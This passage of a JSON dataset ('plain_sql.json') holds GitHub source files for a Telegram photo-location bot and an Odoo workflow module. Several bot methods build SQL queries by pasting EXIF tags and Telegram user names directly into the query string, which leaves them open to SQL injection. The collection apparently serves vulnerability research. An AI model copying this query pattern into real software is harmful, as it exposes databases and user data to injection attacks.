CORPORATION in EXIF\n\n        :param tags: name of a camera and lens from EXIF\n        :return: list with one or two strings which are name of\n        camera and/or lens. If there is not better name for the gadget\n        in database, function just returns name how it is\n        \"\"\"\n        checked_tags = []\n\n        for tag in tags:\n            if tag:  # If there was this information inside EXIF of the photo\n                tag = str(tag).strip()\n                log.info('Looking up collation for %s', tag)\n                query = ('SELECT right_tag '\n                         'FROM tag_table '\n                         'WHERE wrong_tag=\"{}\"'.format(tag))\n                cursor = db.execute_query(query)\n                if not cursor:\n                    log.error(\"Can't check the tag because of the db error\")\n                    log.warning(\"Tag will stay as is.\")\n                    continue\n                if cursor.rowcount:\n                    # Get appropriate tag from the table\n                    tag = cursor.fetchone()[0]\n                    log.info('Tag after looking up in tag_tables - %s.', tag)\n\n            checked_tags.append(tag)\n        return checked_tags\n\n    @staticmethod\n    def _get_dd_coordinate(angular_distance, reference):\n        \"\"\"\n         Convert coordinates from format in which they are typically written\n         in EXIF to decimal degrees - format that Telegram or Google Map\n         understand. Google coordinates, EXIF and decimals degrees if you\n         need to understand what is going on here\n\n         :param angular_distance: ifdTag object from the exifread module -\n         it contains a raw coordinate - either longitude or latitude\n         :param reference:\n          :return: a coordinate in decimal degrees format\n         \"\"\"\n        ag = angular_distance\n        degrees = ag.values[0].num / ag.values[0].den\n        minutes = (ag.values[1].num / ag.values[1].den) / 60\n        seconds = (ag.values[2].num / ag.values[2].den) / 3600\n\n        if reference in 'WS':\n            return -(degrees + minutes + seconds)\n\n        return degrees + minutes + seconds\n\n    def _convert_coordinates(self, raw_data):\n        \"\"\"\n        # Convert GPS coordinates from format in which they are stored in\n        EXIF of photo to format that accepts Telegram (and Google Maps for\n        example)\n\n        :param data: EXIF data extracted from photo\n        :param chat_id: user id\n        :return: either floats that represents longitude and latitude or\n        string with error message dedicated to user\n        \"\"\"\n\n        # Return positive or negative longitude/latitude from exifread's ifdtag\n\n        try:\n            latitude = self._get_dd_coordinate(raw_data.raw_latitude,\n                                               raw_data.latitude_reference)\n            longitude = self._get_dd_coordinate(raw_data.raw_longitude,\n                                                raw_data.longitude_reference)\n\n        except Exception as e:\n            # todo also find out the error in case there is no coordinates in\n            #  raw_data\n            log.error(e)\n            log.error('Cannot read coordinates of this photo.')\n            raw_coordinates = (f'Latitude reference: '\n                               f'{raw_data.latitude_reference}\\n'\n                               f'Raw latitude: {raw_data.raw_latitude}.\\n'\n                               f'Longitude reference: '\n                               f'{raw_data.longitude_reference} '\n                               f'Raw longitude: {raw_data.raw_longitude}.\\n')\n            log.info(raw_coordinates)\n            raise InvalidCoordinates\n\n        else:\n            return latitude, longitude\n\n    @staticmethod\n    def _get_address(latitude, longitude):\n\n        \"\"\"\n         # Get address as a string by coordinates from photo that user sent\n         to bot\n        :param latitude:\n        :param longitude:\n        :return: address as a string where photo was taken; name of\n        country in English and Russian to keep statistics\n        of the most popular countries among users of the bot\n        \"\"\"\n\n        address = {}\n        country = {}\n        coordinates = f\"{latitude}, {longitude}\"\n        log.debug('Getting address from coordinates %s...', coordinates)\n        geolocator = Nominatim()\n\n        try:\n            # Get name of the country in English and Russian language\n            location = geolocator.reverse(coordinates, language='en')\n            address['en-US'] = location.address\n            country['en-US'] = location.raw['address']['country']\n\n            location2 = geolocator.reverse(coordinates, language='ru')\n            address['ru-RU'] = location2.address\n            country['ru-RU'] = location2.raw['address']['country']\n            return address, country\n\n        except Exception as e:\n            log.error('Getting address has failed!')\n            log.error(e)\n            raise\n\n    def _convert_data(self, raw_data):\n        date_time = (str(raw_data.date_time) if raw_data.date_time else None)\n\n        # Merge a brand and model together\n        camera = f'{raw_data.camera_brand} {raw_data.camera_model}'\n        lens = f'{raw_data.lens_brand} {raw_data.lens_model}'\n\n        # Get rid of repetitive words\n        camera = (self._dedupe_string(camera) if camera != ' ' else None)\n        lens = (self._dedupe_string(lens) if lens != ' ' else None)\n\n        camera, lens = self._check_camera_tags([camera, lens])\n\n        try:\n            latitude, longitude = self._convert_coordinates(raw_data)\n        except (InvalidCoordinates, NoCoordinates):\n            address = country = latitude = longitude = None\n        else:\n            try:\n                address, country = self._get_address(latitude, longitude)\n            except Exception as e:\n                log.warning(e)\n                address = country = None\n\n        return date_time, camera, lens, address, country, latitude, longitude\n\n    def get_image_info(self):\n        \"\"\"\n        Read data from photo and prepare answer for user\n        with location and etc.\n        \"\"\"\n        raw_data = RawImageData(self.user, *self._get_raw_data(self.file))\n        image_data = ImageData(self.user, *self._convert_data(raw_data))\n\n        return image_data\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/RandyRomero/photoGPSbot/blob/5de0a4d1881825eca1b39b9d95a9a3218af15487",
        "file_path": "/photogpsbot/users.py",
        "source": "\"\"\"\nModule to manage users of bot: store and update information, interact with\nthe database, keep tack of and switch language of interface for user\n\"\"\"\n\nimport config\nfrom photogpsbot import bot, log, db\nfrom photogpsbot.db_connector import DatabaseError, DatabaseConnectionError\n\nfrom telebot.types import Message\n\nclass User:\n    \"\"\"\n    Class that describes one user of this Telegram bot and helps to store basic\n    info about him and his language of choice for interface of the bot\n    \"\"\"\n    def __init__(self, chat_id, first_name, nickname, last_name,\n                 language='en-US'):\n        self.chat_id = chat_id\n        self.first_name = first_name\n        self.nickname = nickname\n        self.last_name = last_name\n        self.language = language\n\n    def set_language(self, lang):\n        \"\"\"\n        Update language of user in the User object and in the database\n        :param lang: string with language tag like \"en-US\"\n        :return: None\n        \"\"\"\n        log.debug('Updating info about user %s language '\n                  'in memory & database...', self)\n\n        self.language = lang\n\n        query = (\"UPDATE users \"\n                 f\"SET language='{self.language}' \"\n                 f\"WHERE chat_id='{self.chat_id}'\")\n\n        try:\n            db.add(query)\n        except DatabaseError:\n            log.error(\"Can't add new language of %s to the database\", self)\n        else:\n            log.debug('Language updated.')\n\n    def switch_language(self):\n        \"\"\"\n        Switch language from Russian to English or conversely\n        :return: string with language tag like \"en-US\" to be used for\n        rendering menus and messages for user\n        \"\"\"\n        curr_lang = self.language\n        new_lang = 'ru-RU' if self.language == 'en-US' else 'en-US'\n        log.info('Changing user %s language from %s to %s...', self,\n                 curr_lang, new_lang)\n\n        self.set_language(new_lang)\n\n        return new_lang\n\n    def __str__(self):\n        return (f'{self.first_name} {self.nickname} {self.last_name} '\n                f'({self.chat_id}) preferred language: {self.language}')\n\n    def __repr__(self):\n        return (f'{self.__class__.__name__}(chat_id={self.chat_id}, '\n                f'first_name=\"{self.first_name}\", nickname=\"{self.nickname}\", '\n                f'last_name=\"{self.last_name}\", language=\"{self.language}\")')\n\n\nclass Users:\n    \"\"\"\n    Class for managing users of the bot: find them, add to system,\n    cache them from the database, check whether user changed his info etc\n    \"\"\"\n    def __init__(self):\n        self.users = {}\n\n    @staticmethod\n    def get_total_number():\n        \"\"\"\n        Count the total number of users in the database\n        :return: integer which is the total number of users\n        \"\"\"\n        query = \"SELECT COUNT(*) FROM users\"\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            log.error(\"Can't count the total number of users!\")\n            raise\n\n        return cursor.fetchone()[0]\n\n    @staticmethod\n    def get_last_active_users(limit):\n        \"\"\"\n        Get from the database a tuple of users who have been recently using\n        the bot\n        :param limit: integer that specifies how much users to get\n        :return: tuple of tuples with users info\n        \"\"\"\n        log.info('Evaluating last active users with date of '\n                 'last time when they used bot...')\n\n        # From photo_queries_table2 we take chat_id of the last\n        # active users and from 'users' table we take info about these\n        # users by chat_id which is a foreign key\n        query = ('SELECT p.chat_id, u.first_name, u.nickname, u.last_name, '\n                 'u.language '\n                 'FROM photo_queries_table2 p '\n                 'INNER JOIN users u '\n                 'ON p.chat_id = u.chat_id '\n                 'GROUP BY u.chat_id, u.first_name, u.nickname, u.last_name, '\n                 'u.language '\n                 'ORDER BY MAX(time)'\n                 f'DESC LIMIT {limit}')\n\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            log.error(\"Cannot get the last active users because of some \"\n                      \"problems with the database\")\n            raise\n\n        last_active_users = cursor.fetchall()\n        return last_active_users\n\n    def cache(self, limit):\n        \"\"\"\n        Caches last active users from database to a dictionary inside object of\n        this class\n        :param limit: limit of entries to be cached\n        :return: None\n        \"\"\"\n\n        log.debug(\"Start caching last active users from the DB...\")\n\n        try:\n            last_active_users = self.get_last_active_users(limit)\n        except DatabaseConnectionError:\n            log.error(\"Cannot cache users!\")\n            return\n\n        for items in last_active_users:\n            # if chat_id of a user is not known to the program\n            if items[0] not in self.users:\n                # adding users from database to the \"cache\"\n                self.users[items[0]] = User(*items)\n                log.debug(\"Caching user: %s\", self.users[items[0]])\n        log.info('Users have been cached.')\n\n    def clean_cache(self, limit):\n        \"\"\"\n        Method that remove several User objects from cache - the least \n        active users\n        :param limit: number of the users that the method should remove\n        from cache\n        :return: None\n        \"\"\"\n\n        log.info('Figuring out the least active users...')\n        # Select users that the least active recently\n        user_ids = tuple(self.users.keys())\n        query = ('SELECT chat_id '\n                 'FROM photo_queries_table2 '\n                 f'WHERE chat_id in {user_ids} '\n                 'GROUP BY chat_id '\n                 'ORDER BY MAX(time) '\n                 f'LIMIT {limit}')\n\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n            log.error(\"Can't figure out the least active users...\")\n            return\n\n        if not cursor.rowcount:\n            log.warning(\"There are no users in the db\")\n            return\n\n        # Make list out of tuple of tuples that is returned by MySQL\n        least_active_users = [chat_id[0] for chat_id in cursor.fetchall()]\n        log.info('Removing %d least active users from cache...', limit)\n        num_deleted_entries = 0\n        for entry in least_active_users:\n            log.debug('Deleting %s...', entry)\n            deleted_entry = self.users.pop(entry, None)\n            if deleted_entry:\n                num_deleted_entries += 1\n        log.debug(\"%d users were removed from cache.\", num_deleted_entries)\n\n    @staticmethod\n    def _add_to_db(user):\n        \"\"\"\n        Adds User object to the database\n        :param user: User object with info about user\n        :return: None\n        \"\"\"\n        query = (\"INSERT INTO users (chat_id, first_name, nickname, \"\n                 \"last_name, language) \"\n                 f\"VALUES ({user.chat_id}, '{user.first_name}', \"\n                 f\"'{user.nickname}', '{user.last_name}', '{user.language}')\")\n        try:\n            db.add(query)\n        except DatabaseError:\n            log.error(\"Cannot add user to the database\")\n        else:\n            log.info(f\"User {user} was successfully added to the users db\")\n\n    def add_new_one(self, chat_id, first_name, nickname, last_name, language,\n                    add_to_db=True):\n        \"\"\"\n        Function to add a new User in dictionary with users and to the database\n        at one fell swoop\n        :param chat_id: id of a Telegram user\n        :param first_name: first name of a Telegram user\n        :param nickname: nickname of a Telegram user\n        :param last_name: last name of a Telegram user\n        :param language: preferred language of a Telegram user\n        :param add_to_db: whether of not to add user to the database (for\n        example, if bot is caching users from the database, there is clearly\n        no point to add them back to the database)\n        :return: User object with info about the added user\n        \"\"\"\n        user = User(chat_id, first_name, nickname, last_name, language)\n        self.users[chat_id] = user\n        if add_to_db:\n            self._add_to_db(user)\n        return user\n\n    @staticmethod\n    def compare_and_update(user, message):\n        \"\"\"\n        This method compare a user object from the bot and his info from\n        the Telegram message to check whether a user has changed his bio\n        or not. If yes, the user object that represents him in the bot will\n        be updated accordingly. Now this function is called only when a user\n        asks the bot for showing the most popular cams\n\n        :param user: user object that represents a Telegram user in this bot\n        :param message: object from Telegram that contains info about user's\n        message and about himself\n        :return: None\n        \"\"\"\n\n        log.info('Checking whether user have changed his info or not...')\n        msg = message.from_user\n        usr_from_message = User(message.chat.id, msg.first_name, msg.username,\n                                msg.last_name)\n\n        if user.chat_id != usr_from_message.chat_id:\n            log.error(\"Wrong user to compare!\")\n            return\n\n        if user.first_name != usr_from_message.first_name:\n            user.first_name = usr_from_message.first_name\n\n        elif user.nickname != usr_from_message.nickname:\n            user.nickname = usr_from_message.nickname\n\n        elif user.last_name != usr_from_message.last_name:\n            user.last_name = usr_from_message.last_name\n\n        else:\n            log.debug(\"User's info hasn't changed\")\n            return\n\n        log.info(\"User has changed his info\")\n        log.debug(\"Updating user's info in the database...\")\n        query = (f\"UPDATE users \"\n                 f\"SET first_name='{user.first_name}', \"\n                 f\"nickname='{user.nickname}', \"\n                 f\"last_name='{user.last_name}' \"\n                 f\"WHERE chat_id={user.chat_id}\")\n\n        try:\n            db.add(query)\n        except DatabaseError:\n            log.error(\"Could not update info about %s in the database\",\n                      user)\n        else:\n            log.debug(\"User's info has been updated\")\n\n    def find_one(self, message: Message) -> User:\n        \"\"\"\n        Look up a user by a message which we get together with request\n        from Telegram\n        :param message: object from Telegram that contains info about user's\n        message and about himself\n        :return: user object that represents a Telegram user in this bot\n        \"\"\"\n\n        # look up user in the cache of the bot\n        user = self.users.get(message.chat.id, None)\n\n        if user:\n            return user\n\n        # otherwise look up the user in the database\n        log.debug(\"Looking up the user in the database as it doesn't \"\n                  \"appear in cache\")\n        query = (f'SELECT first_name, nickname, last_name, language '\n                 f'FROM users '\n                 f'WHERE chat_id={message.chat.id}')\n\n        try:\n            cursor = db.execute_query(query)\n        except DatabaseConnectionError:\n\n            # Even if the database in unreachable add user to dictionary\n            # with users otherwise the bot will crash requesting this\n            # user's info\n            log.error('Cannot lookup the user with chat_id %d in database',\n                      message.chat.id)\n            msg = message.from_user\n            user = self.add_new_one(message.chat.id, msg.first_name,\n                                    msg.last_name, msg.username,\n                                    language='en-US', add_to_db=False)\n            return user\n\n        if not cursor.rowcount:\n            # This user uses our photoGPSbot for the first time as we\n            # can't find him in the database\n            log.info('Adding totally new user to the system...')\n            msg = message.from_user\n            user = self.add_new_one(message.chat.id, msg.first_name,\n                                    msg.last_name, msg.username,\n                                    language='en-US')\n            bot.send_message(config.MY_TELEGRAM,\n                             text=f'You have a new user! {user}')\n            log.info('You have a new user! Welcome %s', user)\n\n        # finally if the user wasn't found in the cache of the bot, but was\n        # found in the database\n        else:\n            log.debug('User %d has been found in the database',\n                      message.chat.id)\n\n            user_data = cursor.fetchall()[0]\n            user = self.add_new_one(message.chat.id, *user_data,\n                                    add_to_db=False)\n\n        return user\n\n    def __str__(self):\n        return ('Instance of a handler of users. '\n                f'There is {len(self.users)} users in cache right now.')\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/article714/crapo/blob/295685acae29fe15c14503cfb50ac4b27b0a9dde",
        "file_path": "/crapo_tests/models/crm_stage.py",
        "source": "# coding: utf-8\n\n\"\"\"\n2019\nLicense: AGPL-3\n\n@author: C. Guychard (Article 714)\n\n\"\"\"\n\n\nfrom odoo import models, api\nfrom odoo.addons.base_crapo_workflow.mixins import crapo_automata_mixins\n\nimport logging\n\n\nclass CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):\n    _inherit = \"crm.stage\"\n    _state_for_model = \"crm.lead\"\n\n    def write(self, values):\n        if len(self) == 1:\n            if 'crapo_state' not in values and not self.crapo_state:\n                if 'name' in values:\n                    vals = {'name': values['name']}\n                else:\n                    vals = {'name': self.name}\n                mystate = self._compute_related_state(vals)\n                values['crapo_state'] = mystate.id\n\n        return super(CrmStageWithMixin, self).write(values)\n\n    @api.model\n    def create(self, values):\n        if 'crapo_state' not in values and not self.crapo_state:\n            if 'name' in values:\n                vals = {'name': values['name']}\n            mystate = self._compute_related_state(vals)\n            values['crapo_state'] = mystate.id\n\n        return super(CrmStageWithMixin, self).create(values)\n\n    @api.model_cr_context\n    def _init_column(self, column_name):\n        \"\"\" Initialize the value of the given column for existing rows.\n            Overridden here because we need to wrap existing stages in\n            a new crapo_state for each stage (including a default automaton)\n        \"\"\"\n        if column_name not in [\"crapo_state\"]:\n            super(CrmStageWithMixin, self)._init_column(column_name)\n        else:\n            default_compute = self._compute_related_state\n\n            query = 'SELECT id, name FROM \"%s\" WHERE \"%s\" is NULL' % (\n                self._table, column_name)\n            self.env.cr.execute(query)\n            stages = self.env.cr.fetchall()\n\n            for stage in stages:\n                default_value = default_compute(\n                    self, values={'name': stage[1]})\n\n                query = 'UPDATE \"%s\" SET \"%s\"=%%s WHERE id = %s' % (\n                    self._table, column_name, stage[0])\n                logging.error(\"TADAAA: %s\" % query)\n                self.env.cr.execute(query, (default_value,))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/article714/crapo/blob/38710f239ccf44111e54fb8c1c47de2572d96075",
        "file_path": "/base_crapo_workflow/mixins/crapo_automata_mixins.py",
        "source": "# coding: utf-8\n\n# 2018-2019 Article 714\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).\nimport logging\n\nfrom odoo import fields, api, exceptions, _\nfrom odoo import SUPERUSER_ID\nfrom odoo.tools.safe_eval import safe_eval\n\nfrom odoo.addons.base_crapo_workflow.mixins.crapo_readonly_view_mixin import (\n    ReadonlyViewMixin,\n)\n\n\nclass ObjectWithStateMixin(ReadonlyViewMixin):\n    \"\"\"\n        Mixin class that can be used to define an Odoo Model eligible\n        to be managed by a Crapo Automaton\n\n        Should be use as a mixin class in existing objects\n    \"\"\"\n\n    _readonly_domain = (\n        \"[('crapo_readonly_fields', 'like', ',{},'.format(field_name))]\"\n    )\n    _readonly_fields_to_add = [\"crapo_readonly_fields\"]\n\n    automaton = fields.Many2one(\n        comodel_name=\"crapo.automaton\",\n        string=\"Related automaton\",\n        help=(\n            \"The automaton describes the various transitions \"\n            \"an object can go through between states.\"\n        ),\n        default=lambda self: self._get_model_automaton(),\n        store=True,\n        index=True,\n        required=True,\n    )\n\n    state = fields.Many2one(\n        comodel_name=\"crapo.state\",\n        help=\"\"\"State in which this object is\"\"\",\n        track_visibility=\"onchange\",\n        domain=lambda self: self._get_state_domain(),\n        group_expand=\"_read_group_states\",\n        default=lambda self: self._get_default_state(),\n        store=True,\n        index=True,\n        required=True,\n    )\n\n    crapo_readonly_fields = fields.Char(\n        compute=\"_compute_crapo_readonly_fields\", default=\",0,\"\n    )\n\n    @api.depends(\"state\")\n    @api.onchange(\"state\")\n    def _compute_crapo_readonly_fields(self):\n        for rec in self:\n            if rec.state.readonly_fields:\n                rec.crapo_readonly_fields = \",{},\".format(\n                    rec.state.readonly_fields\n                )\n            else:\n                rec.crapo_readonly_fields = \",0,\"\n\n    # Computes automaton for current model\n    @api.model\n    def _get_model_automaton(self):\n        automaton_model = self.env[\"crapo.automaton\"]\n\n        my_model = self.env[\"ir.model\"].search(\n            [(\"model\", \"=\", self._name)], limit=1\n        )\n        my_automaton = automaton_model.search(\n            [(\"model_id\", \"=\", my_model.id)], limit=1\n        )\n\n        if my_automaton:\n            return my_automaton\n        else:\n            return automaton_model.create(\n                {\n                    \"name\": \"Automaton for {}\".format(self._name),\n                    \"model_id\": my_model.id,\n                }\n            )\n\n    # State Management\n    def _get_state_domain(self, domain=None):\n        result = []\n\n        if self.automaton:\n            result.append((\"automaton\", \"=\", self.automaton.id))\n        else:\n            result.append((\"automaton\", \"=\", self._get_model_automaton().id))\n\n        return result\n\n    def _get_default_state(self):\n        domain = self._get_state_domain()\n        state_model = self.env[\"crapo.state\"]\n        automaton = self._get_model_automaton()\n\n        if automaton:\n            domain.append(\"|\")\n            domain.append((\"is_start_state\", \"=\", True))\n            domain.append((\"default_state\", \"=\", 1))\n\n        default_state = state_model.search(domain, limit=1)\n\n        if default_state:\n            return default_state\n        elif automaton:\n            return state_model.create(\n                {\"name\": \"New\", \"automaton\": automaton.id}\n            )\n        else:\n            return False\n\n    def _next_states(self):\n        self.ensure_one()\n        domain = self._get_state_domain()\n\n        next_states = False\n        if self.automaton:\n            eligible_transitions = self.env[\"crapo.transition\"].search(\n                [\n                    (\"automaton\", \"=\", self.automaton.id),\n                    (\"from_state\", \"=\", self.state.id),\n                ]\n            )\n\n            target_ids = eligible_transitions.mapped(lambda x: x.to_state.id)\n\n            if target_ids:\n                domain.append((\"id\", \"in\", target_ids))\n\n                next_states = self.env[\"crapo.state\"].search(domain)\n\n        else:\n            domain.append((\"sequence\", \">\", self.state.sequence))\n            next_states = self.env[\"crapo.state\"].search(domain, limit=1)\n\n        return next_states\n\n    def _read_group_states(self, states, domain, order):\n        search_domain = self._get_state_domain(domain=domain)\n        state_ids = states._search(\n            search_domain, order=order, access_rights_uid=SUPERUSER_ID\n        )\n        return states.browse(state_ids)\n\n    # =================\n    # Write / Create\n    # =================\n    @api.multi\n    def write(self, values):\n        \"\"\"\n            Override write method in order to preventing transitioning\n            to a non eligible state\n        \"\"\"\n        # Look for a change of state\n        target_state_id = None\n        result = True\n\n        if \"state\" in values:\n            target_state_id = values[\"state\"]\n\n        # check if there is a change state needed\n        if target_state_id is not None:\n            # Search for elected transition\n            transition = self._get_transition(target_state_id)\n\n            if transition:\n                result = True\n\n                if transition.write_before:\n                    result = super(ObjectWithStateMixin, self).write(values)\n\n                self.exec_conditions(transition.preconditions, \"Pre\")\n                self.exec_action(transition.action, transition.async_action)\n                self.exec_conditions(transition.postconditions, \"Post\")\n\n                # Return now if write has already been done\n                if transition.write_before:\n                    return result\n\n        return super(ObjectWithStateMixin, self).write(values)\n\n    def _get_transition(self, target_state_id):\n        \"\"\"\n            Retrieve transition between two state\n        \"\"\"\n        # Check if next state is valid\n        current_state = False\n        for rec in self:\n            next_states = rec._next_states()\n            if rec.state.id == target_state_id:\n                current_state = rec.state\n                continue\n            elif not next_states:\n                raise exceptions.ValidationError(\n                    _(\"No target state is elegible for transitionning\")\n                )\n            elif target_state_id not in next_states.ids:\n                raise exceptions.ValidationError(\n                    _(\"State is not in eligible target states\")\n                )\n            elif current_state is not False and current_state != rec.state:\n                raise exceptions.ValidationError(\n                    _(\"Transitionning is not possible from differents states\")\n                )\n            else:\n                current_state = rec.state\n\n        # Search for elected transition\n        transition = self.env[\"crapo.transition\"].search(\n            [\n                (\"from_state\", \"=\", current_state.id),\n                (\"to_state\", \"=\", target_state_id),\n            ],\n            limit=1,\n        )\n\n        return transition\n\n    def exec_conditions(self, conditions, prefix):\n        \"\"\"\n            Execute Pre/Postconditions.\n\n            conditions: must be a safe_eval expression\n            prefix: a string to indicate if it's pre or post conditions\n        \"\"\"\n        if conditions:\n            for rec in self:\n                try:\n                    is_valid = safe_eval(\n                        conditions, {\"object\": rec, \"env\": self.env}\n                    )\n                except Exception as err:\n                    logging.error(\n                        \"CRAPO: Failed to validate transition %sconditions: %s\",\n                        prefix,\n                        str(err),\n                    )\n                    is_valid = False\n\n                # Raise an error if not valid\n                if not is_valid:\n                    raise exceptions.ValidationError(\n                        _(\"Invalid {}-conditions for Object: {}\").format(\n                            prefix, rec.display_name\n                        )\n                    )\n\n    def exec_action(self, action, async_action):\n        if action:\n            context = {\n                \"active_model\": self._name,\n                \"active_id\": self.id,\n                \"active_ids\": self.ids,\n            }\n            if async_action:\n                action.with_delay().run_async(context)\n            else:\n                action.with_context(context).run()\n\n\nclass StateObjectMixin(object):\n    \"\"\"\n    Mixin class that can be used to define a state object\n    that can be used as a crapo_state\n\n    Should be use as a mixin class in existing objects\n    \"\"\"\n\n    automaton = fields.Many2one(\n        comodel_name=\"crapo.automaton\",\n        default=lambda self: self._get_default_automaton(),\n        store=True,\n        required=True,\n        index=True,\n    )\n\n    default_state = fields.Boolean(\n        help=\"Might be use as default stage.\", default=False, store=True\n    )\n\n    # Transitions (inverse relations)\n\n    transitions_to = fields.One2many(\n        string=\"Incomint transitions\",\n        comodel_name=\"crapo.transition\",\n        inverse_name=\"to_state\",\n    )\n\n    transitions_from = fields.One2many(\n        string=\"Outgoing transitions\",\n        comodel_name=\"crapo.transition\",\n        inverse_name=\"from_state\",\n    )\n    # computed field to identify start and end states\n\n    is_start_state = fields.Boolean(\n        \"Start State\",\n        compute=\"_compute_is_start_state\",\n        store=True,\n        index=True,\n    )\n\n    is_end_state = fields.Boolean(\n        \"End State\", compute=\"_compute_is_end_state\", store=True, index=True\n    )\n\n    readonly_fields = fields.Char(\n        help=\"List of model's fields name separated by comma\"\n    )\n\n    @api.depends(\"transitions_to\", \"automaton\")\n    def _compute_is_start_state(self):\n        for record in self:\n            if (\n                len(record.transitions_to) == 0\n                or record.transitions_to is False\n            ):\n                record.is_start_state = True\n            else:\n                record.is_start_state = False\n\n    @api.depends(\"transitions_from\", \"automaton\")\n    def _compute_is_end_state(self):\n        for record in self:\n            if (\n                len(record.transitions_to) == 0\n                or record.transitions_to is False\n            ):\n                record.is_end_state = True\n            else:\n                record.is_end_state = False\n\n    def _do_search_default_automaton(self):\n        return False\n\n    @api.model\n    def _get_default_automaton(self):\n        default_value = 0\n        if \"current_automaton\" in self.env.context:\n            try:\n                default_value = int(self.env.context.get(\"current_automaton\"))\n            except Exception:\n                default_value = 0\n        else:\n            return self._do_search_default_automaton()\n\n        return self.env[\"crapo.automaton\"].browse(default_value)\n\n\nclass WrappedStateMixin(StateObjectMixin):\n    \"\"\"\n    Mixin class that can be used to define a state object that\n    wraps an existing model defining a state for another model\n\n    The wrapped object can be used as a crapo_state\n\n    Should be use as a mixin class in existing objects\n    \"\"\"\n\n    _inherits = {\"crapo.state\": \"crapo_state\"}\n\n    crapo_state = fields.Many2one(\n        comodel_name=\"crapo.state\",\n        string=\"Related Crapo State\",\n        store=True,\n        index=True,\n        required=True,\n        ondelete=\"cascade\",\n    )\n\n    def _do_search_default_automaton(self):\n        \"\"\"\n        finds or creates the default automaton (one per model)\n        \"\"\"\n        automaton_model = self.env[\"crapo.automaton\"]\n        my_model = self.env[\"ir.model\"].search(\n            [(\"model\", \"=\", self._state_for_model)], limit=1\n        )\n        my_automaton = automaton_model.search([(\"model_id\", \"=\", my_model.id)])\n        if not my_automaton:\n            my_automaton = automaton_model.create(\n                {\n                    \"name\": \"Automaton for {}\".format(self._state_for_model),\n                    \"model_id\": my_model.id,\n                }\n            )\n        return my_automaton\n\n    def _compute_related_state(\n        self, values={}\n    ):  # pylint: disable=dangerous-default-value\n        \"\"\"\n        Create a new crapo_state for an existing record of the WrappedState\n        \"\"\"\n        my_automaton = self._do_search_default_automaton()\n\n        if not self.crapo_state:\n            if not my_automaton:\n                return False\n            else:\n                if \"name\" not in values:\n                    values[\"name\"] = \"Default State for %s\" % self.id\n                values[\"automaton\"] = my_automaton.id\n                return self.env[\"crapo.state\"].create(values)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/article714/crapo/blob/38710f239ccf44111e54fb8c1c47de2572d96075",
        "file_path": "/base_crapo_workflow/mixins/crapo_readonly_view_mixin.py",
        "source": "# coding: utf-8\n\n# 2018-2019 Article 714\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).\nimport logging\n\nfrom lxml import etree\nfrom lxml.builder import E\n\nfrom odoo.tools.safe_eval import safe_eval\nfrom odoo.osv import expression\n\n\nclass ReadonlyViewMixin(object):\n    \"\"\"\n        Mixin class that can be used to set a whole view readonly with domains\n    \"\"\"\n\n    _readonly_domain = []\n    _readonly_fields_to_add = []\n\n    def _fields_view_get(\n        self, view_id=None, view_type=\"form\", toolbar=False, submenu=False\n    ):\n        \"\"\"\n            Override to add crapo_readonly_fields to arch and attrs readonly\n            on fields that could be editable\n        \"\"\"\n        result = super(ReadonlyViewMixin, self)._fields_view_get(\n            view_id, view_type, toolbar, submenu\n        )\n\n        readonly_fields = self.fields_get(attributes=[\"readonly\"])\n        node = etree.fromstring(result[\"arch\"])\n        for field in self._readonly_fields_to_add:\n            node.append(E.field(name=field, invisible=\"1\"))\n\n        if not isinstance(self._readonly_domain, (list, tuple)):\n            lst_domain = [self._readonly_domain]\n        else:\n            lst_domain = self._readonly_domain\n\n        self._process_field(node, readonly_fields, lst_domain)\n        result[\"arch\"] = etree.tostring(node)\n        return result\n\n    def _process_field(self, node, readonly_fields, lst_domain):\n        \"\"\"\n            Add readnoly attrs if needed\n        \"\"\"\n        if node.get(\"readonly_global_domain\"):\n            lst_domain = lst_domain + [node.get(\"readonly_global_domain\")]\n\n        if node.tag == \"field\":\n            field_name = node.get(\"name\")\n\n            attrs = safe_eval(node.get(\"attrs\", \"{}\"))\n            readonly = attrs.get(\"readonly\") or node.get(\"readonly\")\n            if isinstance(readonly, str):\n                readonly = safe_eval(node.get(\"readonly\", \"{}\"))\n\n            # Deal with none domain value, if field is explicitly in readonly we skip\n            if not isinstance(readonly, (list, tuple)) and readonly:\n                return\n            # If there is no domain define and fields is already in readonly\n            # we skip too\n            elif readonly is None and readonly_fields[field_name][\"readonly\"]:\n                return\n\n            _readonly_domain = expression.OR(\n                [safe_eval(domain, {\"field_name\": field_name}) for domain in lst_domain]\n            )\n            if readonly:\n                _readonly_domain = expression.OR([readonly, _readonly_domain])\n\n            attrs[\"readonly\"] = _readonly_domain\n            node.set(\"attrs\", str(attrs))\n\n        else:\n            for child_node in node:\n                self._process_field(child_node, readonly_fields, lst_domain)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/article714/crapo/blob/38710f239ccf44111e54fb8c1c47de2572d96075",
        "file_path": "/base_crapo_workflow/models/business_object.py",
        "source": "# coding: utf-8\n\n# 2018-2019 Article 714\n# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).\n\nfrom odoo import models\n\nfrom odoo.addons.base_crapo_workflow.mixins import (\n    crapo_automata_mixins,\n)  # pylint: disable=odoo-addons-relative-import\n\n\nclass CrapoBusinessObject(crapo_automata_mixins.ObjectWithStateMixin, models.Model):\n    \"\"\"\n    Base class to define a Business Object.\n\n    Should be use as a mixin class in existing objects\n    \"\"\"\n\n    _name = \"crapo.business.object\"\n    _inherit = [\"mail.thread\", \"mail.activity.mixin\"]\n    _description = \"\"\"\n    An object on which to  in a workflow, specific to a given model\n    \"\"\"\n    _sync_state_field = \"\"\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/article714/crapo/blob/38710f239ccf44111e54fb8c1c47de2572d96075",
        "file_path": "/base_crapo_workflow/models/state.py",
